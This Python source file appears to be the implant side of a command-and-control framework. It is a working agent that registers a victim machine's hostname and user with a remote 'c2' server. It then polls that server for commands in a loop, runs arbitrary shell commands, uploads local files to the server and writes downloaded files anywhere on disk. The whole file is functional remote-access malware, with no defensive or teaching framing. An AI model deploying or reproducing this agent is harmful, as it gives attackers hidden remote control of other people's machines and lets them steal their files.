import requests as rq
from sys import argv
from functions import *
import time
import os
from pathlib import Path

# Configuration constants
serverip = None
agent_id = None
REQUEST_TIMEOUT = 30  # seconds for most requests
UPLOAD_TIMEOUT = 120  # seconds for file uploads
DOWNLOAD_TIMEOUT = 120  # seconds for file downloads
SLEEP_TIME = 3

# function to send to server a join request to c2
def connect():
    r = rq.post(f"http://{serverip}/join", params={
        'hostname': get_hostname(),
        'user': get_whoami()
    }, timeout=REQUEST_TIMEOUT).json()
    print(r)
    if r["status"]:
        print("[+] connected to server successfully, id =", r["id"])
        return r["id"]
    return None


def check_commands():
    r = rq.get(f"http://{serverip}/agent/get_commands/{agent_id}", timeout=REQUEST_TIMEOUT)
    commands = r.json()['commands']
    if commands:
        print("[+] got new commands !!")
        print("[+] commands =", commands)
    return commands


def execute_exec_command(command_data):
    """Execute a shell command"""
    try:
        command = command_data.get('command', '')
        result = execute_command(command)
        return {'status': 'success', 'result': result}
    except Exception as e:
        return {'status': 'error', 'error': str(e)}


def execute_upload_command(command_data):
    """Upload a file from agent to server"""
    try:
        source_path = command_data.get('source_path', '')
        filename = command_data.get('filename', os.path.basename(source_path))

        # Check if file exists
        if not os.path.exists(source_path):
            return {'status': 'error', 'error': f'File not found: {source_path}'}

        # Read and upload file
        with open(source_path, 'rb') as f:
            files = {'file': (filename, f)}
            params = {'agent_id': agent_id}
            r = rq.post(f"http://{serverip}/agent/upload_file", params=params, files=files, timeout=UPLOAD_TIMEOUT)

        if r.status_code == 200:
            result = r.json()
            return {
                'status': 'success',
                'result': f"Uploaded {result['filename']} ({result['size']} bytes)"
            }
        else:
            return {'status': 'error', 'error': f'Upload failed: {r.text}'}

    except Exception as e:
        return {'status': 'error', 'error': str(e)}


def execute_download_command(command_data):
    """Download a file from server to agent"""
    try:
        url = command_data.get('url', '')
        save_as = command_data.get('save_as', '')

        if not url or not save_as:
            return {'status': 'error', 'error': 'Missing url or save_as'}

        # Download file with timeout
        r = rq.get(f"http://{serverip}{url}", stream=True, timeout=DOWNLOAD_TIMEOUT)

        # Check file size from Content-Length header before downloading
        if 'content-length' in r.headers:
            file_size = int(r.headers['content-length'])
            MAX_DOWNLOAD_SIZE = 100 * 1024 * 1024  # 100MB
            if file_size > MAX_DOWNLOAD_SIZE:
                return {'status': 'error', 'error': f'File too large: {file_size} bytes (max 100MB)'}

        if r.status_code == 200:
            # Create directory if needed
            save_path = Path(save_as)
            save_path.parent.mkdir(parents=True, exist_ok=True)

            # Save file
            with open(save_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)

            file_size = os.path.getsize(save_path)
            return {
                'status': 'success',
                'result': f"Downloaded to {save_as} ({file_size} bytes)"
            }
        else:
            return {'status': 'error', 'error': f'Download failed: {r.status_code}'}

    except Exception as e:
        return {'status': 'error', 'error': str(e)}


def execute_command_by_type(command):
    """Route command to appropriate handler based on type"""
    cmd_type = command.get('type', 'exec')
    cmd_data = command.get('data', {})

    if cmd_type == 'exec':
        return execute_exec_command(cmd_data)
    elif cmd_type == 'upload':
        return execute_upload_command(cmd_data)
    elif cmd_type == 'download':
        return execute_download_command(cmd_data)
    else:
        return {'status': 'error', 'error': f'Unknown command type: {cmd_type}'}


def send_result(command_id, result):
    """Send result for a single command"""
    params = {
        'agent_id': agent_id,
        'command_id': command_id,
        'status': result['status'],
        'result': result.get('result'),
        'error': result.get('error')
    }
    r = rq.post(f"http://{serverip}/agent/set_command_result", params=params, timeout=REQUEST_TIMEOUT)
    print(f"[+] Result sent: {r.json()}")


def main():
    if len(argv) != 2:
        print("Usage: python main.py <ip>")
        return
    global agent_id
    global serverip
    serverip = argv[1]
    agent_id = connect()

    if not agent_id:
        print("[-] Failed to connect to server")
        return

    print("[+] Agent running. Polling for commands...")
    while True:
        time.sleep(SLEEP_TIME)
        try:
            commands = check_commands()
            for command in commands:
                cmd_id = command['command_id']
                cmd_type = command.get('type', 'exec')
                print(f"[+] Executing {cmd_type} command {cmd_id}")

                result = execute_command_by_type(command)
                print(f"[+] Result: {result['status']}")

                send_result(cmd_id, result)
        except Exception as e:
            print(f"[-] Error in main loop: {e}")
            time.sleep(5)  # Wait a bit longer on error







main()